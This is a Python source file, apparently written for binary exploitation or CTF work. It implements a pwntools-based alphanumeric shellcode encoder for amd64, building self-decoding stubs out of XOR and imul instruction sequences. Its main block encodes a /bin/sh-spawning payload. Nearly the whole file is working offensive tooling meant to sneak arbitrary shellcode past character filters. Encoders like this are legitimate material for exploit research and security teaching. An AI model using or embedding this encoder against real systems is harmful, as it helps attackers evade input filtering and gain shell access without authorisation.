import pwn
import itertools
import functools
import typing
import struct

# pwn.context.log_level = "debug"
pwn.context.arch = "amd64"


class lazy(object):
    """lazy descriptor

    Used as a decorator to create lazy attributes. Lazy attributes
    are evaluated on first use.
    """

    def __init__(self, func):
        self.__func = func
        functools.wraps(self.__func)(self)

    def __get__(self, inst, inst_cls):
        if inst is None:
            return self

        if not hasattr(inst, '__dict__'):
            raise AttributeError("'%s' object has no attribute '__dict__'" % (inst_cls.__name__,))

        name = self.__name__
        if name.startswith('__') and not name.endswith('__'):
            name = '_%s%s' % (inst_cls.__name__, name)

        value = self.__func(inst)
        inst.__dict__[name] = value
        return value

    @classmethod
    def invalidate(cls, inst, name):
        """Invalidate a lazy attribute.

        This obviously violates the lazy contract. A subclass of lazy
        may however have a contract where invalidation is appropriate.
        """
        inst_cls = inst.__class__

        if not hasattr(inst, '__dict__'):
            raise AttributeError("'%s' object has no attribute '__dict__'" % (inst_cls.__name__,))

        if name.startswith('__') and not name.endswith('__'):
            name = '_%s%s' % (inst_cls.__name__, name)

        if not isinstance(getattr(inst_cls, name), cls):
            raise AttributeError("'%s.%s' is not a %s attribute" % (inst_cls.__name__, name, cls.__name__))

        if name in inst.__dict__:
            del inst.__dict__[name]


class MulNumNotFind(Exception):
    pass


class EncoderUntil(object):
    alphanum_pool = b'UVWXYZABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrstuvwxyz0123456789'
    xor_table = None
    inited = False

    @staticmethod
    def init():
        pwn.context.arch = "amd64"
        xor_table = [0] * 0x80
        for i in itertools.product(EncoderUntil.alphanum_pool, repeat=2):
            n = i[0] ^ i[1]
            xor_table[n] = i
        EncoderUntil.xor_table = xor_table
        EncoderUntil.inited = True

    @staticmethod
    def shift_xor(data: bytes):
        assert len(data) == 8

        def get_code(low_8bit):
            return next(filter(lambda x: x & 0xf == low_8bit, EncoderUntil.alphanum_pool))

        code_array1 = []
        code_array2 = []
        init_num = 0
        for i in range(8):
            b = (data[i] ^ init_num) & 0xf
            code = get_code(b)
            code_array1.append(code)
            b2 = (data[i] ^ code) >> 4
            code2 = get_code(b2)
            code_array2.append(code2)
            init_num = code2 >> 4

        return bytes(code_array2), bytes(code_array1)

    @staticmethod
    def shellcode_xor(shellcode: bytes):
        enc_code = b"a" * 8
        shellcode = pwn.asm("mov rsp, r9") + shellcode + b"\x90" * 8
        for i in range(len(shellcode) // 8):
            data = shellcode[:8]
            shellcode = shellcode[8:]
            c1, c2 = EncoderUntil.shift_xor(data)
            enc_code += c1 + c2
        return enc_code

    @staticmethod
    def gen_xor_encoder(data_length):
        xor_encoder_template = ''

        xor_encoder_template += str(AutoNumGen(data_length))
        xor_encoder_template += '''
    push rax
    pop rcx
    '''

        xor_encoder_template += '''
    / save rsp t0 r9
    push rsp
    pop r9
    
    push 0x30
    pop rax
    xor al, 0x30
    xor rax, [r9+0x30]
    xor [r9+0x30], rax
    lea rsp, [rip + data + 8]
    xor [r9+0x30], rsp  # we save rsp addr to [r9+0x30]
    
xor_loop:
    pop rax
    imul rax, rax, 16
    
    / clean rsi
    push rsi
    push rsp
    pop rdx
    xor rsi, [rdx]
    pop r8
    
    / mov rsi, rax
    push rax
    xor rsi, [rdx]
    pop r8
    
    / mov rsp, rdx
    push rsp
    pop rdx
    
    xor rsi, [rdx]
    pop rax
    
    / xarg rsp, [r9+0x30]
    xor rsp, [r9+0x30]
    xor [r9+0x30], rsp
    xor rsp, [r9+0x30]
    
    / save data to [r9+0x30] 
    push rsi
    pop rax
    pop rax
    
    / xarg rsp, [r9+0x30]
    xor rsp, [r9+0x30]
    xor [r9+0x30], rsp
    xor rsp, [r9+0x30]
    
    loop xor_loop
    
data:
'''
        xor_shellcode = pwn.asm(xor_encoder_template)

        pwn.log.debug(f"disasm shellcode\n {pwn.disasm(xor_shellcode)}")
        pwn.log.info(f"xor shellcode: \n{pwn.hexdump(xor_shellcode)}")

        return xor_shellcode

    # if n < 0x80 then x^y == n
    # x && y in alphanum
    @staticmethod
    def try_xor_code8(code: int):
        assert code < 0x80
        if not EncoderUntil.inited:
            EncoderUntil.init()
        return EncoderUntil.xor_table[code]

    @staticmethod
    def try_xor_code32(code: int):
        if not EncoderUntil.inited:
            EncoderUntil.init()
        assert code & 0x80808080 == 0
        a = [EncoderUntil.xor_table[i] for i in pwn.p32(code)]
        return pwn.u32(bytes([i[0] for i in a])), pwn.u32(bytes([i[1] for i in a]))

    @staticmethod
    def can_xor(code: int):
        while code > 0:
            if code & 0xff >= 0x80:
                return False
            code = code >> 8
        return True

    @staticmethod
    def is_alphanum(code: int):
        while code > 0:
            if code & 0xff not in EncoderUntil.alphanum_pool:
                return False
            code = code >> 8
        return True

    @staticmethod
    def try_mul_xor_code(target_number: int):
        assert target_number < 0x10000

        # the iter and mapreduce is lazy in python3.6 ?
        # so we don't need to cache
        numbers = map(lambda x: (x[0] << 8) + x[1], itertools.product(EncoderUntil.alphanum_pool, repeat=2))
        f = filter(lambda x: EncoderUntil.is_alphanum(((x[0] * x[1]) & 0xffff) ^ target_number),
                   itertools.product(numbers, repeat=2))
        try:
            mul_num = next(f)
        except StopIteration:
            raise MulNumNotFind(f"can not find mul tuble for code {target_number} !!")
        return mul_num[0], mul_num[1], ((mul_num[0] * mul_num[1]) & 0xffff) ^ target_number

    @staticmethod
    def try_mul_code(target_number: int):
        assert target_number < 0x10000

        # the iter and mapreduce is lazy in python3.6 ?
        # so we don't need to cache
        numbers = map(lambda x: (x[0] << 8) + x[1], itertools.product(EncoderUntil.alphanum_pool, repeat=2))
        f = filter(lambda x: (x[0] * x[1]) & 0xffff == target_number, itertools.product(numbers, repeat=2))
        try:
            mul_num = next(f)
        except StopIteration:
            raise MulNumNotFind(f"can not find mul tuble for code {target_number} !!")
        return mul_num

    @staticmethod
    def padding_code(size: int):
        data = b''
        data += b'PX' * (size // 2)
        if size % 2 == 1:
            data += b"P"
        return data


# # init some static table
# EncoderUntil.init()


class Shellcode(object):
    @lazy
    def asm(self):
        return pwn.asm(str(self))

    def __len__(self):
        return len(self.asm)

    @property
    def code(self):
        return str(self)

    @property
    def offset(self):
        if self.__offset is int:
            return self.__offset
        else:
            return self.__offset()


class CleanRax(Shellcode):
    clean_rax = '''
    push 0x30
    pop rax
    xor al, 0x30
    '''

    def __str__(self):
        return self.clean_rax


# set 16bit number to rax
# modify rsp
class NumGen16(Shellcode):
    def __init__(self, data: int):
        assert 0 <= data <= 0xffff
        self.data = data

    def build_code(self):
        if self.data == 0:
            shellcode = str(CleanRax())
        elif EncoderUntil.can_xor(self.data):
            code = XorReg(self.data)
            shellcode = str(code)
        else:
            try:
                code = MulReg(self.data)
                shellcode = str(code)
                shellcode += str(MovReg(src="rdi", dst="rax"))
            except MulNumNotFind:
                shellcode = None

            if shellcode is None:
                shellcode = str(MulXorReg(self.data))

        return shellcode

    def __str__(self):
        return self.build_code()


# set 64bit number to rax
# modify rcx
class NumGen(Shellcode):
    def __init__(self, data: int):
        self.data = data

    def build_code(self):
        data_words = []
        data = self.data
        for i in range(4):
            data_words.append((data & 0xffff, i))
            data = data >> 16
        data_words.sort()
        shellcode = ''
        # set rcx == rsp
        shellcode += '''
        push rsp
        pop rcx
        '''

        shellcode += str(CleanRax())

        # [rcx+0x30] == 0
        shellcode += '''    
        xor rax, [rcx+0x30]
        xor [rcx+0x30], rax
        '''

        # TODO: this can be optimize
        prev_number = None
        for i in data_words:
            if i[0] != 0:
                if prev_number != i[0]:
                    shellcode += str(NumGen16(data=i[0]))
                prev_number = i[0]
                shellcode += '''
                xor [rcx+0x%x], ax
                ''' % (i[1] * 2 + 0x30)

        shellcode += str(CleanRax())
        shellcode += "xor rax, [rcx+0x30]"

        return shellcode

    def __str__(self):
        return self.build_code()


# gen a 0xffffffffffffffff and save to r15 reg
# modify rsp, rcx, rax, rdi
class NegReg(Shellcode):
    initd = False
    # 0x5671 *  0x5671 == 0x1cd8ffff
    neg_reg = '''
    push r15
    push rsp
    pop rcx
    xor r15, [rcx]
    
    push 0x30
    pop rax
    xor al, 0x30
    
    xor rax, [rcx+0x30]
    xor [rcx+0x30], rax

    pop rax
    push 0x3030556f    # set di = 0xffff
    imul di, WORD PTR [rcx], 0x5671
    
    xor [rcx+0x30], di
    xor [rcx+0x32], di
    xor [rcx+0x34], di
    xor [rcx+0x36], di

    / r15==0, rcx+0x30 == 0xffffffffffffffff
    xor r15, [rcx+0x30]
    '''

    def __str__(self):
        return self.neg_reg


# set data to dst use imul
# modify rsp
class MulReg(Shellcode):
    mul_reg = '''
    push {mul1:#x}
    push rsp
    pop {src} 
    imul {dst}, WORD PTR [{src}], {mul2:#x}
    '''

    def __init__(self, data: int, dst: str = "di", src: str = "rax"):
        if dst not in ("di", "si"):
            raise Exception("the dest reg must in di, si")
        if src not in ("rcx", "rax", "r8", "r9"):
            raise Exception("the src reg must in rcx, rax, r8, r9")

        self.mul1, self.mul2 = EncoderUntil.try_mul_code(data)
        self.src = src
        self.dst = dst

    def __str__(self):
        # we must push dword to avoid \0
        return self.mul_reg.format(mul1=self.mul1 | 0x30300000, mul2=self.mul2, dst=self.dst, src=self.src)


# mov src to rdi/rsi
# modify rsp, rcx, rdx
class MovReg2(Shellcode):
    mov_reg2 = '''
        push {dst}
        push rsp
        pop {tmp}
        xor {dst}, [{tmp}]
        pop {tmp2}
        push {src}
        xor {dst}, [{tmp}]
    '''

    def __init__(self, src: str, dst: str):
        src_reg = (
            "rax", "rcx", "rbx", "rdx", "rsp", "rbp", "rsi", "rdi", "r8", "r9", "r10", "r11", "r12", "r13", "r14",
            "r15")
        dst_reg = ("rdi", "rsi")
        if src not in src_reg:
            raise Exception(f"the src reg not {str(src_reg)[1:-1]}")
        if dst not in dst_reg:
            raise Exception(f"the dst reg not {str(src_reg)[1:-1]}")
        self.src = src
        self.dst = dst

    def __str__(self):
        tmp = "rcx"
        tmp2 = "rdx"
        if self.src == "rcx":
            tmp = "rax"
        elif self.src == "rdx":
            tmp2 = "rax"
        return self.mov_reg2.format(src=self.src, dst=self.dst, tmp=tmp, tmp2=tmp2)


# mov src to dst
class MovReg(Shellcode):
    mov_reg = '''
        push {src}
        pop {dst}
    '''

    def __init__(self, src: str, dst: str):
        src_reg = (
            "rax", "rcx", "rbx", "rdx", "rsp", "rbp", "rsi", "rdi", "r8", "r9", "r10", "r11", "r12", "r13", "r14",
            "r15")
        dst_reg = ("rax", "rcx", "rdx", "r8", "r9", "r10")
        if src not in src_reg:
            raise Exception(f"the src reg not {str(src_reg)[1:-1]}")
        if dst not in dst_reg:
            raise Exception(f"the dst reg not {str(src_reg)[1:-1]}")
        self.src = src
        self.dst = dst

    def __str__(self):
        return self.mov_reg.format(src=self.src, dst=self.dst)


# set dword value to rax reg
class XorReg(Shellcode):
    xor_reg = '''
    push {xor1:#x}
    pop rax
    xor eax, {xor2:#x}
    '''

    def __init__(self, data: int):
        self.data = data
        self.xor1, self.xor2 = EncoderUntil.try_xor_code32(data)

    def __str__(self):
        return self.xor_reg.format(xor1=self.xor1, xor2=self.xor2)


# set data to rax use imul && xor
# modify rsp
class MulXorReg(Shellcode):
    mul_xor_reg = '''
    push {mul1:#x}
    push rsp
    pop {src}
    imul {dst}, WORD PTR [{src}], {mul2:#x}
    push r{dst}
    pop rax
    xor ax, {xor:#x}
    '''

    def __init__(self, data: int, dst: str = "di", src: str = "rax"):
        if dst not in ("di", "si"):
            raise Exception("the dest reg must in di, si")
        if src not in ("rcx", "rax", "r8", "r9"):
            raise Exception("the src reg must in rcx, rax, r8, r9")

        self.mul1, self.mul2, self.xor = EncoderUntil.try_mul_xor_code(data)
        self.src = src
        self.dst = dst

    def __str__(self):
        # we must push dword to avoid \0
        return self.mul_xor_reg.format(mul1=self.mul1 | 0x30300000, mul2=self.mul2, xor=self.xor, dst=self.dst,
                                       src=self.src)


# set 64bit data to rax with shortest length
class AutoNumGen(Shellcode):
    def __init__(self, data: int):
        assert -0x7fffffffffffffff <= data < 0x10000000000000000
        self.number = data

    def build_code(self):
        if 0 <= self.number <= 0xffff:
            shellcode = str(NumGen16(self.number))
        elif self.number >= 0x10000:
            shellcode = str(NumGen(self.number))
        elif self.number < 0:
            num = 0xffffffffffffffff ^ (0x10000000000000000 + self.number)
            if -0xffff <= self.number:
                shellcode = str(NumGen16(num))
            else:
                shellcode = str(NumGen(num))

            shellcode += '''
                push rax
                pop rdx
                
                push rsp
                pop rcx
            '''
            shellcode += str(CleanRax())
            shellcode += '''
                xor rax, [rcx+0x30]
                xor [rcx+0x30], rax
                xor [rcx+0x30], r15
                xor rdx, [rcx+0x30]
                push rdx
                pop rax
            '''
        return shellcode

    def __str__(self):
        return self.build_code()


# do xor [rcx+data_offset], enc_data
class Xor2(Shellcode):
    def __init__(self, data_offset: int, enc_data: int, base_off: str = "r9"):
        if base_off not in ("r9",):
            raise Exception("the base_off reg must in r9")
        self.data_offset = data_offset
        self.enc_data = enc_data
        self.base_off = base_off

    def build_code(self):
        if 0 < self.data_offset < 0xff and EncoderUntil.is_alphanum(self.data_offset):
            shellcode = str(AutoNumGen(self.enc_data))
            shellcode += """
            xor [{base}+{off}], ax
            """.format(base=self.base_off, off=self.data_offset)
        else:
            shellcode = str(AutoNumGen(self.data_offset - 0x30))
            shellcode += str(MovReg2(src="rax", dst="rsi"))
            shellcode += str(AutoNumGen(self.enc_data))
            shellcode += """
            xor [{base}+rsi+0x30], ax
            """.format(base=self.base_off)
        return shellcode

    def __str__(self):
        return self.build_code()


class Encoder(object):
    def __init__(self, shellcode: bytes, base_reg: str, offset: int = 0):
        self.shellcode = shellcode
        self.base_reg = base_reg
        self.base_offset = offset

    def data_calc(self):
        length = len(self.shellcode)
        shellcode = bytearray(self.shellcode)
        i = 0
        enc_datas = []
        while i < length - 1:
            if shellcode[i] in EncoderUntil.alphanum_pool:
                i += 1
            else:
                data = shellcode[i] + (shellcode[i + 1] * 0x100)
                data = data ^ 0x3030
                enc_datas.append((i, data))
                shellcode[i] = 0x30
                shellcode[i + 1] = 0x30
                i += 2
        if i != length and shellcode[i] not in EncoderUntil.alphanum_pool:
            shellcode.append(0x30)
            data = shellcode[i] + (shellcode[i + 1] * 0x100)
            data = data ^ 0x3030
            enc_datas.append((i, data))
            shellcode[i] = 0x30
        return bytes(shellcode), enc_datas

    def encode(self):
        data_offset = 0
        while True:
            shellcode = ""
            shellcode += str(MovReg(src=self.base_reg, dst="r9"))
            data, enc_array = self.data_calc()

            for i in enc_array:
                shellcode += str(Xor2(data_offset=self.base_offset + data_offset + i[0], enc_data=i[1]))
            asm_code = pwn.asm(shellcode)
            pwn.log.debug(f"len: {len(asm_code)}")
            pwn.log.debug(f"try off: {data_offset}")
            if len(asm_code) < data_offset:
                break
            inc_count = (len(asm_code) - data_offset) // 10
            if inc_count == 0:
                inc_count = 1
            data_offset += inc_count
        padding_size = data_offset - len(asm_code)
        asm_code = asm_code + EncoderUntil.padding_code(size=padding_size) + data
        return asm_code


def encoder_with_xor_compress(shellcode: bytes, base_reg, offset=0):
    shellcode_xor = EncoderUntil.gen_xor_encoder((len(shellcode) // 8) + 1)
    e = Encoder(shellcode=shellcode_xor, base_reg=base_reg, offset=offset)
    enc_shellcode = e.encode()
    enc_shellcode += EncoderUntil.shellcode_xor(shellcode)
    return enc_shellcode


def encoder_direct(shellcode: bytes, base_reg, offset=0):
    e = Encoder(shellcode=shellcode, base_reg=base_reg, offset=offset)
    enc_shellcode = e.encode()
    return enc_shellcode


def encode(shellcode: bytes, base_reg, offset=0):
    pwn.log.progress("shellcode is generating, plz wait")
    shellcode1 = encoder_direct(shellcode, base_reg, offset)
    shellcode2 = encoder_with_xor_compress(shellcode, base_reg, offset)
    return shellcode1 if len(shellcode1) < len(shellcode2) else shellcode2


if __name__ == '__main__':
    sh = pwn.asm(pwn.shellcraft.amd64.linux.sh())
    print(encode(sh, "rax"))
